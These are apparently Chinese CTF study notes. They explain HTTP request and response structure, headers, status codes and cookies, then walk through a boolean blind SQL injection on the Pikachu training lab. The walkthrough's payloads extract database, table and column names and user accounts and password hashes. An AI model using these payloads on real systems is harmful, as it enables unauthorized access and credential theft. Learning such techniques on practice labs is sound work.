# http相关
get请求参数：请求页面信息，并返回实体主体

post请求参数：向指定资源提交数据进行处理请求（可能导致新资源建立和已有资源的修改） 

## 一、HTTP 是什么
HTTP：超文本传输协议，浏览器和服务器之间通信的规则，**无状态、明文传输**

+ 无状态：服务器不会记住上一次是谁、发过什么包；每次请求独立。
+ 端口：默认 80（HTTP）；HTTPS 默认 443（加密）
+ 基于 TCP，先建立 TCP 连接，再发 HTTP 请求

## 二、HTTP 请求包结构（Burp Raw 里面看到的样子）
1. **请求行**：方法 + URL + 协议版本 例：`POST /pikachu/vul/sqli/bool_sqli.php HTTP/1.1`
2. **请求头（Headers）**：一堆键值对，告诉服务器浏览器信息
3. **空一行 **<font style="background-color:rgba(255,246,122,0.8);">必须！分隔头和 body</font>
4. **请求体 Body**（POST 才有，GET 一般没有 body） 例：`username=a' and 1=1 -- `

### 重点请求方法（CTF 最常用）
+ GET：参数放 URL 后面 `?id=1`，可见、容易被日志记录，适合传简单参数
+ POST：参数放在 Body 里，不在 URL，适合表单、提交 payload（你现在布尔盲注就是 POST）
+ HEAD：只拿响应头，不要页面内容
+ PUT / DELETE：文件上传、删除类漏洞常考
+ 补充：GET 可以带 body，只是很多服务器不规范处理，靶场很少用

网安考点：很多前端看着是 GET，抓包改包可以换成 POST；或者后端只判断参数，不校验请求方法（方法绕过）

## 三、常见请求头（必考，Burp 里天天见）
+ Host：目标主机地址（127.0.0.1）
+ User-Agent：浏览器标识，WAF 经常用来做拦截
+ Content-Type：告诉服务器 body 是什么格式 
    - `application/x-www-form-urlencoded`：普通表单（皮卡丘默认）
    - `application/json`：JSON 接口
    - `multipart/form-data`：上传文件
+ Cookie：身份凭证，会话、登录状态，XSS 偷 Cookie
+ Referer：从哪个页面跳过来的，存在 Referer 校验绕过
+ Accept：浏览器能接收什么类型响应
+ X-Forwarded-For（XFF）：伪造来源 IP，IP 绕过考点

## 四、HTTP 响应包结构
1. 状态行：协议 + 状态码 + 描述
2. 响应头
3. 空行
4. 响应体（页面 HTML、返回结果，布尔盲注就是看这里有没有 “存在 / 不存在”）

### 常用状态码（记这几个足够 CTF 入门）
+ 200 OK：成功，正常返回页面
+ 301/302 重定向：跳转页面
+ 400 Bad Request：请求格式错
+ 401 Unauthorized：未登录
+ 403 Forbidden：禁止访问（有权限，不给看）
+ 404 Not Found：页面不存在
+ 500 Internal Server Error：服务器报错！SQL 注入最期待看到的报错回显

## 五、GET 和 POST 对比
+ GET：参数在 URL，`?id=xxx`；长度有限；会被缓存、日志记录；适合查询
+ POST：参数在 Body；长度没有硬性限制；适合提交 payload、表单上传

做题重点：不是看页面表单，以 Burp 抓到的包 Method 为准！ 前端可以用 JS 伪装。

## 六、Cookie、Session（无状态的解决方案）
+ Cookie：服务器下发，存在浏览器本地，每次请求自动带上
+ Session：存在服务器，Cookie 里面存 sessionid 作为钥匙 考点：Cookie 注入、Cookie 伪造、Session 劫持、XSS 偷 Cookie

## 七、编码
+ URL 编码：`空格→%20`、`<→%3C`，浏览器自动编码，Burp 发包默认会自动编码，有时候要关闭编码直接发原始 payload
+ 什么时候要手动编码：绕过 WAF、特殊符号截断

## 布尔盲注
后端SQL大概率是这样的

```plain
select * from users where username='$name'
```

思路

1. 判断注入点 

输入：`a' and 1=1 --`页面正常（真）

输入：`a' and 1=2 --`页面空白（假）

说明是字符型布尔盲注

2.猜数据库名字长度

payload：

```plain
a' and length(database())>5 --
```

调整数字，找到精确长度

3. **逐字符猜库名** payload 模板：

```plain
a' and ascii(substr(database(),1,1))>100 --
```

`substr(内容,第几位,取1个)`，`ascii()`拿到字符编码，对比大小，二分法提速。 第一位、第二位…… 依次猜

4. **猜表名** 先猜表数量，再猜每个表名字长度，再逐字符猜表名：

```plain
a' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --
```

`limit 0,1` 取第一个表，`limit 1,1` 第二个表。找到 users 表。

5. **猜字段名**

```plain
a' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --
```

猜出 username、password。

6. **猜账号密码内容**

```plain
a' and ascii(substr((select username from users limit 0,1),1,1))>100 --
```

依次猜每一个用户的账号和密码密文。
